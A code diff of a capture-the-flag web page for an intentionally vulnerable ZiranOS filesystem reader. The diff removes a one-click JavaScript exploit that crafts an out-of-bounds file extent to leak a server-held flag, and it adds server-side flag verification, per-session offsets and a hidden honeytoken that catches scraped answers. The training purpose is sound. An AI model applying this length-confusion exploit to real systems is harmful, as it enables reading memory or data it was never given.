@@ -44,8 +44,12 @@
     secret lives only in the server, so nothing local reveals it. You develop the
     exploit against Tier 1, then <b>land it here</b> to capture a flag you genuinely
     could not see. The bug: the server's reader trusts the length in <i>your</i>
-    header, so a file extent that runs off the end of your upload reads the flag the
-    host appended right after it.
+    header, so a file extent that runs off the end of your upload reads a secret the
+    host planted past it. <b>You craft and drive the exploit yourself</b> in the
+    terminal — there's no one-click button here (that's Tier 1's job). And the flag's
+    exact offset is <b>per session</b>: <code>load</code> prints where it sits for
+    <i>your</i> instance, so a copied writeup won't hit it — you have to aim at the
+    offset this session gives you.
   </div>
 
   <div id="terminal"></div>
@@ -64,34 +68,44 @@
   </div>
 
   <div class="panel">
-    <h2 style="margin-top:.2rem">Land the exploit</h2>
+    <h2 style="margin-top:.2rem">Submit your flag</h2>
     <p class="note">
-      One click drives it: it uploads a crafted image whose one file's extent points
-      just past your own bytes — into the 64-byte region where the host appended your
-      session flag — then <code>cat</code>s it. Or type it by hand in the terminal.
+      Once you've made the remote filesystem print <code>FLAG{ziran-tier2-…}</code>,
+      submit it here. It's checked <b>server-side by hash</b> against the flag minted
+      for your session — the page never learns the answer, and a flag scraped from
+      the repo or this page won't verify.
     </p>
     <div style="display:flex; gap:.5rem; align-items:center; flex-wrap:wrap">
-      <button class="primary" id="run">▸ Run the capture</button>
-      <span class="note" id="run-status"></span>
+      <input id="flag-input" type="text" size="40" placeholder="FLAG{ziran-tier2-…}"
+             style="background:#0b0e14; color:#a6e3a1; border:1px solid #45507a; border-radius:6px; padding:.5rem .6rem; font-family:ui-monospace,monospace">
+      <button class="primary" id="submit">Verify</button>
+      <span class="note" id="submit-status"></span>
     </div>
   </div>
 
   <div class="panel">
-    <h2 style="margin-top:.2rem">Walkthrough <span class="dim">(spoilers)</span></h2>
-    <details><summary>The layout</summary><p class="note">
-      On upload the server builds one buffer: <code>[ your image (N bytes) | your flag (64) ]</code>.
-      You're told the disk is only your <code>N</code> bytes — but the whole buffer is
-      mounted, and the flag sits at exactly <code>[N, N+64)</code>.</p></details>
-    <details><summary>The bug</summary><p class="note">
-      The reader believes the <code>total_size</code> in your header instead of the
-      real buffer length, and leaves extents unconfined. So a file entry with
-      <code>offset = N, length = 64</code> passes validation and reads straight into
-      the appended flag — bytes you never uploaded. "Validating against a length the
-      caller supplies is not validation."</p></details>
-    <details><summary>By hand</summary><p class="note">
-      Craft a minimal 48-byte ZranFS image (superblock + one file entry) whose file's
-      <code>offset</code> is 48 and <code>length</code> is 64, base64 it, then in the
-      terminal: <code>load</code> ⏎, paste, <code>.</code> ⏎, <code>cat /loot</code>.</p></details>
+    <h2 style="margin-top:.2rem">The idea <span class="dim">(concept, not a recipe)</span></h2>
+    <p class="note">
+      The <b>concept</b> is the same length-confusion bug you already broke in
+      <a href="./ctf.html">Tier 1</a>: the reader trusts a length your header supplies
+      instead of the real buffer, and leaves file extents unconfined — so an extent
+      that runs past your upload reads server bytes you were never given.
+      <i>Validating against a length the caller supplies is not validation.</i>
+    </p>
+    <details><summary>How this differs from Tier 1</summary><p class="note">
+      The secret isn't in your image — the host plants it past your upload, so no
+      local <code>strings</code>/DevTools can reach it. And its offset is
+      <b>per session</b>: on a successful <code>load</code> the kernel prints the exact
+      offset where the secret sits <i>for your instance</i>. Read that line, then craft
+      an extent that reaches it. A fixed offset copied from a writeup won't land —
+      that's the point.</p></details>
+    <p class="note">
+      Develop and rehearse the full byte-level exploit in the free
+      <a href="./ctf.html">Tier-1 sandbox</a> (where the flag is your own, so you can
+      iterate), then reproduce it here against the offset this session hands you.
+      Drive it by hand in the terminal: <code>load</code> ⏎, paste your crafted base64
+      image, <code>.</code> ⏎, then <code>cat</code> the crafted file.
+    </p>
   </div>
 
   <footer>
@@ -100,6 +114,16 @@
     <a href="https://github.com/kenlacroix/ZiranOS" target="_blank" rel="noopener">source</a> ·
     <a href="./index.html">guided tour</a>
   </footer>
+
+  <!--
+    Honeytoken tripwire — this is NOT the flag. It is a fixed, public decoy. The real
+    flag is minted per session and only ever printed by the running kernel, so the
+    only way to submit this exact value is to have scraped the page/repo instead of
+    landing the exploit. The server verifies by hash, rejects it, and logs the attempt
+    as a shortcut. See ctf-server/bridge.mjs (HONEYTOKEN). Diligent solvers never see
+    it; only an automated grab of "the flag in the page" trips it.
+  -->
+  <span hidden data-example-flag="FLAG{ziran-tier2-000000000000d0cy}"></span>
 
   <script type="module">
     import './vendor/xterm.js'; // window.Terminal
@@ -116,82 +140,81 @@
     term.focus();
 
     // ---- capture detection: the server's per-session flag format ----------------
-    let captured = false, seen = '';
+    // Seeing the flag in the terminal means the exploit landed (it only prints if a
+    // crafted extent reached the planted secret). We prefill the submit box and ask
+    // the SERVER to verify it by hash — the client never decides a capture is real.
+    let submitted = '', seen = '';
     const FLAG_RE = /FLAG\{ziran-tier2-[0-9a-f]+\}/;
     const origWrite = term.write.bind(term);
     term.write = (data, cb) => {
       const s = typeof data === 'string' ? data : dec.decode(data);
       seen = (seen + s).slice(-4096);
       const m = seen.match(FLAG_RE);
-      if (m && !captured) {
-        captured = true;
-        document.getElementById('capture-flag').textContent = m[0];
-        const el = document.getElementById('capture');
-        el.classList.add('show');
-        el.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      if (m && m[0] !== submitted) {
+        document.getElementById('flag-input').value = m[0];
+        submitFlag(m[0]); // auto-verify what we saw, server-side
       }
       return origWrite(data, cb);
     };
 
     // ---- WebSocket transport: terminal <-> the bridge's serial pipe -------------
+    // The socket also carries a small control channel (flag submit / verify result),
+    // distinguished by a 4-byte "\0CTL" prefix the kernel never emits over serial.
+    const CTL = new Uint8Array([0x00, 0x43, 0x54, 0x4c]);
+    const isCtl = (u8) => u8.length >= 4 && u8[0] === 0 && u8[1] === 67 && u8[2] === 84 && u8[3] === 76;
+    const setSubmitStatus = (t) => { document.getElementById('submit-status').textContent = t; };
     let ws;
+
+    // Send a captured flag to the bridge for server-side hash verification.
+    function submitFlag(flag) {
+      if (!FLAG_RE.test(flag)) { setSubmitStatus('that is not a FLAG{ziran-tier2-…} string'); return; }
+      if (!ws || ws.readyState !== WebSocket.OPEN) { setSubmitStatus('not connected'); return; }
+      submitted = flag;
+      const body = new TextEncoder().encode(JSON.stringify({ type: 'submit', flag }));
+      const frame = new Uint8Array(CTL.length + body.length);
+      frame.set(CTL, 0); frame.set(body, CTL.length);
+      ws.send(frame);
+      setSubmitStatus('verifying…');
+    }
+
+    function onVerify(result) {
+      if (result === 'correct') {
+        setSubmitStatus('');
+        document.getElementById('capture-flag').textContent = submitted;
+        const el = document.getElementById('capture');
+        el.classList.add('show');
+        el.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      } else if (result === 'honeytoken') {
+        setSubmitStatus('⚠ that is the public decoy — the real flag is per-session. Land the exploit on THIS instance.');
+      } else {
+        setSubmitStatus('✗ not this session’s flag.');
+      }
+    }
+
     function connect() {
       status('connecting to ' + WS_URL + ' …');
       ws = new WebSocket(WS_URL);
       ws.binaryType = 'arraybuffer';
       ws.onopen = () => status('connected — the server is booting the kernel…');
-      ws.onmessage = (e) => term.write(typeof e.data === 'string' ? e.data : new Uint8Array(e.data));
+      ws.onmessage = (e) => {
+        if (typeof e.data === 'string') { term.write(e.data); return; }
+        const u8 = new Uint8Array(e.data);
+        if (isCtl(u8)) { // control frame: a verify result
+          try { const msg = JSON.parse(dec.decode(u8.subarray(4))); if (msg.type === 'verify') onVerify(msg.result); } catch {}
+          return;
+        }
+        term.write(u8);
+      };
       ws.onclose = (e) => status('disconnected (' + (e.reason || 'code ' + e.code) + '). reload to reconnect.');
       ws.onerror = () => status('connection error — the server may be busy or down.');
       term.onData((d) => { if (ws && ws.readyState === WebSocket.OPEN) ws.send(d); });
     }
     connect();
 
-    // ---- the Tier-2 crafted image (built in-page) ------------------------------
-    const enc = new TextEncoder();
-    // 48 bytes: superblock + one file entry "loot" whose extent [48, 112) points past
-    // the upload, into the 64-byte flag region the host appends right after it.
-    function craftedImage() {
-      const SB = 16, DIRENT = 32, n = SB + DIRENT; // 48
-      const b = new Uint8Array(n);
-      const le16 = (o, v) => { b[o] = v & 255; b[o + 1] = (v >> 8) & 255; };
-      const le32 = (o, v) => { b[o] = v & 255; b[o + 1] = (v >> 8) & 255; b[o + 2] = (v >> 16) & 255; b[o + 3] = (v >> 24) & 255; };
-      b.set(enc.encode('ZRFS'), 0);
-      le16(4, 3);            // version
-      le16(6, 1);            // file_count
-      le32(8, n);            // total_size = 48 (honest — the header the reader trusts)
-      le32(12, n);           // data_end = 48
-      b.set(enc.encode('loot'), 16);   // entry name (NUL-padded to 20)
-      le32(16 + 20, n);      // offset = 48  -> into the appended flag region
-      le32(16 + 24, 64);     // length = 64  -> the whole flag region
-      le32(16 + 28, 0);      // kind = file
-      return b;
-    }
-    const toB64 = (u8) => { let s = ''; for (const x of u8) s += String.fromCharCode(x); return btoa(s); };
-
-    async function runCapture() {
-      const send = (s) => { if (ws && ws.readyState === WebSocket.OPEN) ws.send(s); };
-      if (!ws || ws.readyState !== WebSocket.OPEN) { return 'not connected'; }
-      const b64 = toB64(craftedImage());
-      term.focus();
-      send('load\r');
-      await sleep(400);                       // let cmd_load reach its read loop
-      for (let i = 0; i < b64.length; i += 40) { send(b64.slice(i, i + 40) + '\r'); await sleep(20); }
-      send('.\r');                            // end-of-image sentinel
-      await sleep(700);
-      send('cat /loot\r');                    // read the crafted file -> leaks the flag
-      return 'sent';
-    }
-
-    document.getElementById('run').onclick = async () => {
-      const btn = document.getElementById('run');
-      const st = document.getElementById('run-status');
-      btn.disabled = true;
-      st.textContent = 'driving the exploit…';
-      const r = await runCapture();
-      st.textContent = r === 'sent' ? 'sent — watch the terminal for FLAG{…}' : r;
-      btn.disabled = false;
-    };
+    document.getElementById('submit').onclick = () => submitFlag(document.getElementById('flag-input').value.trim());
+    document.getElementById('flag-input').addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') submitFlag(e.target.value.trim());
+    });
   </script>
 </body>
 </html>
